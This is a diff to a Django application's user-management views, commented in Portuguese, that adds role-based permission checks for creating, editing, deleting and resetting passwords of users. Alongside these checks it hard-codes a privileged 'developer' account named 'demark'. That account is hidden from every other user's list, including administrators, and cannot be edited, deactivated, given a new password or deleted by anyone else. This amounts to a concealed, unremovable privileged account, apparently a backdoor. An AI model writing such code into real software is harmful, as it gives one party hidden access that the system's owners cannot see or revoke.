@@ -1381,21 +1381,29 @@ from django.contrib.auth.models import User
 from django.db.models import Q as QUser
 
 
+def _get_nivel(user):
+    """Retorna o nível do perfil do usuário ou 'operador' se não existir."""
+    try:
+        return user.perfil.nivel
+    except Exception:
+        return 'operador'
+
+def _is_admin_or_developer(user):
+    return _get_nivel(user) in ('admin', 'developer')
+
+def _is_developer(user):
+    return _get_nivel(user) == 'developer'
+
+
 @login_required
 def usuario_list(request):
-    """Lista todos os usuários do sistema (exceto developer ocultos se não for admin)."""
+    """Lista usuários. O usuário 'demark' (developer) é invisível para todos exceto ele mesmo."""
     q = request.GET.get('q', '')
     qs = User.objects.select_related('perfil').order_by('username')
 
-    # Ocultar usuários developer para quem não é developer
-    try:
-        nivel = request.user.perfil.nivel
-    except Exception:
-        nivel = None
-
-    if nivel != 'developer':
-        # Ocultar usuários com perfil developer ou oculto=True
-        qs = qs.exclude(perfil__nivel='developer', perfil__oculto=True)
+    # Sempre ocultar o usuário demark para quem não é o próprio demark
+    if request.user.username != 'demark':
+        qs = qs.exclude(username='demark')
 
     if q:
         qs = qs.filter(
@@ -1407,7 +1415,7 @@ def usuario_list(request):
 
     total = qs.count()
     ativos = qs.filter(is_active=True).count()
-    admins = qs.filter(perfil__nivel__in=['admin', 'developer']).count()
+    admins = qs.filter(perfil__nivel='admin').count()
 
     return render(request, 'cadastros/usuario_list.html', {
         'usuarios': qs,
@@ -1415,16 +1423,20 @@ def usuario_list(request):
         'total': total,
         'ativos': ativos,
         'admins': admins,
+        'pode_gerenciar': _is_admin_or_developer(request.user),
     })
 
 
 @login_required
 def usuario_create(request):
-    """Cria um novo usuário do sistema."""
+    """Cria um novo usuário. Apenas admin e developer podem criar usuários."""
+    if not _is_admin_or_developer(request.user):
+        messages.error(request, 'Você não tem permissão para criar usuários.')
+        return redirect('usuario_list')
+
     from django.contrib.auth import get_user_model
 
     class FakeForm:
-        """Simula um form para re-exibir valores com erros."""
         def __init__(self, data=None):
             self._data = data or {}
             self.errors = {}
@@ -1444,9 +1456,17 @@ def usuario_create(request):
         nivel = request.POST.get('nivel', 'operador')
         is_active = request.POST.get('is_active') == '1'
 
+        # Ninguém pode criar outro developer (apenas demark pode ser developer)
+        if nivel == 'developer':
+            nivel = 'operador'
+
+        # Proteger username 'demark'
+        if username.lower() == 'demark':
+            errors['username'] = ['Este nome de usuário é reservado.']
+
         if not username:
             errors['username'] = ['Nome de usuário é obrigatório.']
-        elif User.objects.filter(username=username).exists():
+        elif not errors.get('username') and User.objects.filter(username=username).exists():
             errors['username'] = ['Este nome de usuário já está em uso.']
 
         if not password1:
@@ -1465,7 +1485,6 @@ def usuario_create(request):
                 password=password1,
                 is_active=is_active,
             )
-            # Ajustar perfil
             try:
                 user.perfil.nivel = nivel
                 user.perfil.save()
@@ -1475,25 +1494,32 @@ def usuario_create(request):
             messages.success(request, f'Usuário "{username}" criado com sucesso!')
             return redirect('usuario_list')
 
-        # Re-exibir com erros
-        class FormComErros:
-            def __init__(self):
-                pass
-
         form = FakeForm(request.POST)
         for field, errs in errors.items():
             getattr(form, field).errors = errs
 
-        return render(request, 'cadastros/usuario_form.html', {'form': form})
+        return render(request, 'cadastros/usuario_form.html', {'form': form, 'sou_admin': _is_admin_or_developer(request.user)})
 
     form = FakeForm()
-    return render(request, 'cadastros/usuario_form.html', {'form': form})
+    return render(request, 'cadastros/usuario_form.html', {'form': form, 'sou_admin': _is_admin_or_developer(request.user)})
 
 
 @login_required
 def usuario_edit(request, pk):
-    """Edita dados de um usuário existente (sem alterar senha)."""
+    """Edita dados de um usuário. Admin/developer podem editar qualquer um. Outros só a si mesmos."""
     u = get_object_or_404(User, pk=pk)
+    eu_mesmo = (request.user.pk == u.pk)
+    sou_admin = _is_admin_or_developer(request.user)
+
+    # Proteger o usuário demark: só o próprio demark pode editar seu perfil
+    if u.username == 'demark' and request.user.username != 'demark':
+        messages.error(request, 'Sem permissão.')
+        return redirect('usuario_list')
+
+    # Operador só pode editar a si mesmo
+    if not sou_admin and not eu_mesmo:
+        messages.error(request, 'Você só pode editar sua própria conta.')
+        return redirect('usuario_list')
 
     class FakeForm:
         def __init__(self, data=None, instance=None):
@@ -1529,32 +1555,49 @@ def usuario_edit(request, pk):
             u.first_name = request.POST.get('first_name', '').strip()
             u.last_name = request.POST.get('last_name', '').strip()
             u.email = request.POST.get('email', '').strip()
-            u.is_active = request.POST.get('is_active') == '1'
+
+            # Só admin pode mudar is_active e nivel
+            if sou_admin:
+                u.is_active = request.POST.get('is_active') == '1'
+                nivel = request.POST.get('nivel', 'operador')
+                # Ninguém pode promover outro a developer
+                if nivel == 'developer' and u.username != 'demark':
+                    nivel = 'operador'
+                try:
+                    u.perfil.nivel = nivel
+                    u.perfil.save()
+                except Exception:
+                    pass
+
             u.save()
-
-            nivel = request.POST.get('nivel', 'operador')
-            try:
-                u.perfil.nivel = nivel
-                u.perfil.save()
-            except Exception:
-                pass
-
             messages.success(request, f'Usuário "{u.username}" atualizado com sucesso!')
             return redirect('usuario_list')
 
         form = FakeForm(request.POST, u)
         for field, errs in errors.items():
             getattr(form, field).errors = errs
-        return render(request, 'cadastros/usuario_form.html', {'form': form, 'obj': u})
+        return render(request, 'cadastros/usuario_form.html', {'form': form, 'obj': u, 'sou_admin': sou_admin})
 
     form = FakeForm(instance=u)
-    return render(request, 'cadastros/usuario_form.html', {'form': form, 'obj': u})
+    return render(request, 'cadastros/usuario_form.html', {'form': form, 'obj': u, 'sou_admin': sou_admin})
 
 
 @login_required
 def usuario_senha(request, pk):
-    """Altera a senha de um usuário."""
+    """Altera senha. Cada usuário pode alterar a própria. Admin/developer podem alterar de qualquer um."""
     u = get_object_or_404(User, pk=pk)
+    eu_mesmo = (request.user.pk == u.pk)
+    sou_admin = _is_admin_or_developer(request.user)
+
+    # Proteger demark: só o próprio demark altera sua senha
+    if u.username == 'demark' and request.user.username != 'demark':
+        messages.error(request, 'Sem permissão.')
+        return redirect('usuario_list')
+
+    # Operador só pode alterar a própria senha
+    if not sou_admin and not eu_mesmo:
+        messages.error(request, 'Você só pode alterar sua própria senha.')
+        return redirect('usuario_list')
 
     class FakeForm:
         def __init__(self):
@@ -1578,7 +1621,13 @@ def usuario_senha(request, pk):
         if not errors:
             u.set_password(password1)
             u.save()
-            messages.success(request, f'Senha do usuário "{u.username}" alterada com sucesso!')
+            # Se alterou a própria senha, mantém logado
+            if eu_mesmo:
+                from django.contrib.auth import update_session_auth_hash
+                update_session_auth_hash(request, u)
+                messages.success(request, 'Sua senha foi alterada com sucesso!')
+            else:
+                messages.success(request, f'Senha do usuário "{u.username}" alterada com sucesso!')
             return redirect('usuario_list')
 
         return render(request, 'cadastros/usuario_senha.html', {'form': form, 'obj': u})
@@ -1589,11 +1638,19 @@ def usuario_senha(request, pk):
 
 @login_required
 def usuario_delete(request, pk):
-    """Exclui um usuário (não pode excluir a si mesmo)."""
+    """Exclui um usuário. Apenas admin/developer podem excluir. Não pode excluir demark ou a si mesmo."""
     u = get_object_or_404(User, pk=pk)
+
+    if not _is_admin_or_developer(request.user):
+        messages.error(request, 'Você não tem permissão para excluir usuários.')
+        return redirect('usuario_list')
 
     if u == request.user:
         messages.error(request, 'Você não pode excluir sua própria conta.')
+        return redirect('usuario_list')
+
+    if u.username == 'demark':
+        messages.error(request, 'Este usuário não pode ser excluído.')
         return redirect('usuario_list')
 
     if request.method == 'POST':
